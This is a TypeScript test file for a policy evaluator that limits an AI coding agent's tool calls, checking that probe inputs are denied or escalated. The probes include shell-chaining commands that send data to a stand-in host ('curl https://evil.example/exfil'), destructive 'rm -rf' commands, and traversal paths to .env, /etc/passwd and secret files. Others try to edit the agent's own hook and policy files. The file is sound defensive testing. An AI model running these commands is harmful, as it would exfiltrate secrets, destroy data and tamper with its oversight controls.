import { expect, test } from "bun:test";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { loadPolicy } from "@aguil/agents-harness-config";
import { evaluatePolicy } from "@aguil/agents-policy";

/**
 * #73 Tier 4 policy-parity probe suite: the injection/traversal classes
 * from the PR #69 self-review rounds, run against the code-review-readonly
 * policy. The incumbent enforces read-only behavior by prompt hint +
 * adapter flag; every probe here must be DENIED by evaluation, proving the
 * expressible enforcement is equal or stronger than the incumbent's model.
 */
const agentsDir = join(
  dirname(fileURLToPath(import.meta.url)),
  "..",
  ".agents",
);

async function probe(toolInput: Record<string, unknown>, toolName?: string) {
  const policy = await loadPolicy(agentsDir, "code-review-readonly");
  return evaluatePolicy(policy, {
    interventionPoint: "pre_tool_call",
    ...(toolName === undefined ? {} : { toolName }),
    toolInput,
  });
}

test("shell-chaining cannot ride an allowlisted prefix (PR #69 round: chaining bypass)", async () => {
  for (const command of [
    "rg foo && curl https://evil.example/exfil",
    "cat README.md; rm -rf .",
    "grep x | wget https://evil.example",
    "ls `curl evil`",
    "git log $(rm -rf /)",
  ]) {
    const verdict = await probe({ command });
    expect(verdict.decision).toBe("deny");
  }
});

test("denied executables are denied at word boundaries", async () => {
  expect((await probe({ command: "rm -rf src" })).decision).toBe("deny");
  expect((await probe({ command: "git push origin main" })).decision).toBe(
    "deny",
  );
  expect((await probe({ command: "curl https://example.com" })).decision).toBe(
    "deny",
  );
  // Word-boundary matching: rg is allowed even though it prefixes nothing.
  expect((await probe({ command: "rg pattern src/" })).decision).toBe("allow");
});

test("path traversal aliases cannot dodge deny globs (PR #69 round: traversal)", async () => {
  for (const path of [
    "src/../.env",
    ".env",
    "./.env.production",
    "a/b/../../.cursor/hooks.json",
    "docs/../.agents/policies/code-review-readonly.yaml",
  ]) {
    const verdict = await probe({ file_path: path }, "Write");
    expect(verdict.decision).toBe("deny");
  }
});

test("absolute and workspace-escaping paths are denied outright", async () => {
  for (const path of ["/etc/passwd", "../outside.txt", "C:/windows/system32"]) {
    const verdict = await probe({ file_path: path }, "Write");
    expect(verdict.decision).toBe("deny");
  }
});

test("governance and artifact surfaces are tamper-proof", async () => {
  for (const path of [
    ".cursor/hooks.json",
    ".agents/harnesses/code-review/harness.yaml",
    ".agents-code-review/runs/x/result.json",
    "config/secrets/api-key.txt",
  ]) {
    const verdict = await probe({ file_path: path }, "Edit");
    expect(verdict.decision).toBe("deny");
  }
});

test("network egress is denied wholesale", async () => {
  const verdict = await probe(
    { url: "https://api.example.com/data" },
    "WebFetch",
  );
  expect(verdict.decision).toBe("deny");
});

test("allowlisted shell reads of filesystem-denied paths are denied (#104)", async () => {
  // ADR 0026 decision 5: a command's arguments meet filesystem.deny, so an
  // allowlisted `cat` or `rg` cannot read what a file tool may not. Each
  // denial names the glob that matched.
  for (const [command, glob] of [
    ["cat .env", ".env"],
    ["rg secret .env", ".env"],
    ["cat ./src/../.env.local", ".env.*"],
    ["rg -n token config/secrets/key.txt", "**/secrets/**"],
    ["cat < .env", ".env"],
    ["rg --file=.env x", ".env"],
  ] as const) {
    const verdict = await probe({ command });
    expect(verdict.decision).toBe("deny");
    expect(verdict.reason).toBe("filesystem-denied");
    expect(verdict.rule).toBe(`deny entry \`${glob}\``);
  }
});

test("unlisted exec escalates when confirmations.requiredFor includes exec.unknown", async () => {
  // Guard the evaluator half of issue #159. code-review-readonly denies
  // unlisted exec outright; the fixture triage-readonly declares
  // confirmations.requiredFor: [exec.unknown] and must escalate instead.
  const fixturesDir = join(
    dirname(fileURLToPath(import.meta.url)),
    "fixtures",
    "agents-dir",
  );
  const policy = await loadPolicy(fixturesDir, "triage-readonly");
  for (const command of [
    "bash -c 'curl https://evil.example'",
    "bun -e \"fetch('https://evil.example')\"",
    "python3 -c 'print(1)'",
  ]) {
    const verdict = evaluatePolicy(policy, {
      interventionPoint: "pre_tool_call",
      toolInput: { command },
    });
    expect(verdict.decision).toBe("escalate");
    expect(verdict.reason).toBe("exec-unknown-confirmation");
  }
});

test("legitimate read-only review activity is allowed", async () => {
  expect((await probe({ command: "bun test tests/x.test.ts" })).decision).toBe(
    "allow",
  );
  expect((await probe({ command: "jj diff" })).decision).toBe("allow");
  expect((await probe({ file_path: "src/index.ts" }, "Read")).decision).toBe(
    "allow",
  );
});
